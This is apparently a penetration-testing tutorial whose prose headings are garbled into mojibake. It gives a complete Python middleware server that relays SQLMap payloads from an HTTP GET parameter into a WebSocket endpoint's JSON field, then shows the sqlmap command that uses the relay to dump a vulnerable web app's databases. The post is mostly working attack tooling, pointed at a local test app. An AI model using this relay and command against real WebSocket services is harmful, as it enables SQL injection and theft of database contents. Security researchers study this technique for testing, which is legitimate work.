										ğ—›ğ—§ğ—§ğ—£ ğ—¦ğ—²ğ—¿ğ˜ƒğ—²ğ—¿ ğ˜€ğ—°ğ—¿ğ—¶ğ—½ğ˜ ğ˜ğ—µğ—®ğ˜ ğ˜„ğ—¶ğ—¹ğ—¹ ğ—¿ğ—²ğ—°ğ—²ğ—¶ğ˜ƒğ—² ğ˜ğ—µğ—² ğ—¦ğ—¤ğ—Ÿğ— ğ—®ğ—½ ğ—½ğ—®ğ˜†ğ—¹ğ—¼ğ—®ğ—± ğ˜ƒğ—¶ğ—® ğ—šğ—˜ğ—§ ğ—½ğ—®ğ—¿ğ—®ğ—ºğ—²ğ˜ğ—²ğ—¿

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

ğ—œğ˜ ğ—¶ğ˜€ ğ˜€ğ—¶ğ—ºğ—¶ğ—¹ğ—®ğ—¿ ğ˜ğ—¼ ğ—¦ğ—¤ğ—Ÿğ— ğ—®ğ—½ ğ˜ğ—®ğ—ºğ—½ğ—²ğ—¿ ğ˜€ğ—°ğ—¿ğ—¶ğ—½ğ˜ğ˜€ ğ—¯ğ˜‚ğ˜ ğ—¶ğ—» ğ˜ğ—µğ—¶ğ˜€ ğ—°ğ—®ğ˜€ğ—² ğ˜ğ—µğ—² ğ˜€ğ—°ğ—¿ğ—¶ğ—½ğ˜ ğ˜„ğ—¶ğ—¹ğ—¹ ğ—®ğ—°ğ˜ ğ—®ğ˜€ ğ—® ğ˜€ğ˜ğ—®ğ—»ğ—±ğ—®ğ—¹ğ—¼ğ—»ğ—² ğ˜€ğ—²ğ—¿ğ˜ƒğ—²ğ—¿ ğ˜ƒğ˜‚ğ—¹ğ—»ğ—²ğ—¿ğ—®ğ—¯ğ—¹ğ—² ğ˜ğ—¼ ğ—¦ğ—¤ğ—Ÿğ—¶ ğ—¼ğ—» ğ—šğ—˜ğ—§ ğ—½ğ—®ğ—¿ğ—®ğ—ºğ—²ğ˜ğ—²ğ—¿. ğ—›ğ—²ğ—¿ğ—² ğ—¶ğ˜€ ğ˜ğ—µğ—² ğ—³ğ˜‚ğ—¹ğ—¹ ğ—£ğ˜†ğ˜ğ—µğ—¼ğ—»ğŸ¯ ğ˜€ğ—°ğ—¿ğ—¶ğ—½ğ˜ ğ—°ğ—¿ğ—²ğ—®ğ˜ğ—²ğ—± ğ—³ğ—¼ğ—¿ ğ˜ğ—µğ—² ğ˜ƒğ˜‚ğ—¹ğ—»ğ—²ğ—¿ğ—®ğ—¯ğ—¹ğ—² ğ˜„ğ—²ğ—¯ ğ—®ğ—½ğ—½


from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

ğ—§ğ—µğ—² ğ˜€ğ—°ğ—¿ğ—¶ğ—½ğ˜ ğ˜„ğ—¶ğ—¹ğ—¹ ğ—°ğ—¿ğ—²ğ—®ğ˜ğ—² ğ—®ğ—» ğ—›ğ—§ğ—§ğ—£ ğ—¦ğ—²ğ—¿ğ˜ƒğ—²ğ—¿ ğ—¼ğ—» ğ—½ğ—¼ğ—¿ğ˜ ğŸ´ğŸ¬ğŸ´ğŸ­ ğ—®ğ—»ğ—± ğ—²ğ˜…ğ˜ğ—¿ğ—®ğ—°ğ˜ ğ—³ğ—¶ğ—¿ğ˜€ğ˜ ğ—šğ—˜ğ—§ ğ—½ğ—®ğ—¿ğ—®ğ—ºğ—²ğ˜ğ—²ğ—¿ ğ˜ƒğ—®ğ—¹ğ˜‚ğ—², ğ˜€ğ—²ğ—»ğ—± ğ˜ğ—µğ—² ğ˜ƒğ—®ğ—¹ğ˜‚ğ—² ğ˜ğ—¼  ğ˜€ğ—²ğ—»ğ—±_ğ˜„ğ˜€  ğ—³ğ˜‚ğ—»ğ—°ğ˜ğ—¶ğ—¼ğ—» ğ˜„ğ—µğ—²ğ—¿ğ—² ğ—¶ğ˜ ğ˜„ğ—¶ğ—¹ğ—¹ ğ—¯ğ—² ğ—³ğ—¼ğ—¿ğ—ºğ—®ğ˜ğ—²ğ—± ğ—®ğ˜€ ğ—® ğ—ğ—¦ğ—¢ğ—¡ ğ—ºğ—²ğ˜€ğ˜€ğ—®ğ—´ğ—² ğ—®ğ˜€ ğ—¿ğ—²ğ—¾ğ˜‚ğ—¶ğ—¿ğ—²ğ—± ğ—¯ğ˜† ğ˜ğ—µğ—² ğ˜ƒğ˜‚ğ—¹ğ—»ğ—²ğ—¿ğ—®ğ—¯ğ—¹ğ—² ğ˜„ğ—²ğ—¯ ğ—®ğ—½ğ—½.
ğ—œğ˜ ğ˜„ğ—¶ğ—¹ğ—¹ ğ˜ğ—µğ—²ğ—» ğ—²ğ˜€ğ˜ğ—®ğ—¯ğ—¹ğ—¶ğ˜€ğ—µ ğ—® ğ—ªğ—²ğ—¯ğ—¦ğ—¼ğ—°ğ—¸ğ—²ğ˜ ğ—°ğ—¼ğ—»ğ—»ğ—²ğ—°ğ˜ğ—¶ğ—¼ğ—» ğ˜ğ—¼ ğ˜ğ—µğ—² ğ˜€ğ—²ğ—¿ğ˜ƒğ—²ğ—¿ ğ—²ğ—»ğ—±ğ—½ğ—¼ğ—¶ğ—»ğ˜ ğ—ºğ—²ğ—»ğ˜ğ—¶ğ—¼ğ—»ğ—²ğ—± ğ—¶ğ—»  ğ˜„ğ˜€_ğ˜€ğ—²ğ—¿ğ˜ƒğ—²ğ—¿  ğ˜ƒğ—®ğ—¿ğ—¶ğ—®ğ—¯ğ—¹ğ—² ğ—®ğ—»ğ—± ğ˜€ğ—²ğ—»ğ—± ğ˜ğ—µğ—² ğ—½ğ—®ğ˜†ğ—¹ğ—¼ğ—®ğ—±.

ğ—¡ğ—¼ğ˜„ ğ˜ğ—¼ ğ˜ğ—²ğ˜€ğ˜ ğ—¼ğ˜‚ğ˜ ğ—¼ğ˜‚ğ—¿ ğ—ºğ—¶ğ—±ğ—±ğ—¹ğ—²-ğ˜„ğ—®ğ—¿ğ—² ğ˜€ğ—²ğ—¿ğ˜ƒğ—²ğ—¿ ğ—¶ğ—» ğ—®ğ—°ğ˜ğ—¶ğ—¼ğ—», ğ—œâ€™ğ—¹ğ—¹ ğ—³ğ—¶ğ—¿ğ˜€ğ˜ ğ—µğ—¼ğ˜€ğ˜ ğ˜ğ—µğ—² ğ˜ƒğ˜‚ğ—¹ğ—»ğ—²ğ—¿ğ—®ğ—¯ğ—¹ğ—² ğ˜„ğ—²ğ—¯ ğ—®ğ—½ğ—½ ğ—®ğ—»ğ—± ğ—¹ğ—®ğ˜‚ğ—»ğ—°ğ—µ ğ˜ğ—µğ—² ğ—®ğ—¯ğ—¼ğ˜ƒğ—² ğ˜€ğ—°ğ—¿ğ—¶ğ—½ğ˜ ğ—¶ğ—» ğ—® ğ˜ğ—²ğ—¿ğ—ºğ—¶ğ—»ğ—®ğ—¹. ğ—§ğ—µğ—²ğ—» ğ—²ğ˜…ğ—²ğ—°ğ˜‚ğ˜ğ—² ğ—¦ğ—¤ğ—Ÿğ— ğ—®ğ—½ ğ—®ğ—´ğ—®ğ—¶ğ—»ğ˜€ğ˜ ğ˜ğ—µğ—² ğ—ºğ—¶ğ—±ğ—±ğ—¹ğ—²-ğ˜„ğ—®ğ—¿ğ—² ğ˜€ğ—²ğ—¿ğ˜ƒğ—²ğ—¿ ğ—µğ—¼ğ˜€ğ˜ğ—²ğ—± ğ—¼ğ—» ğ—½ğ—¼ğ—¿ğ˜ ğŸ´ğŸ¬ğŸ´ğŸ­:

sqlmap -u "http://localhost:8081/?id=1" --batch --dbs

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
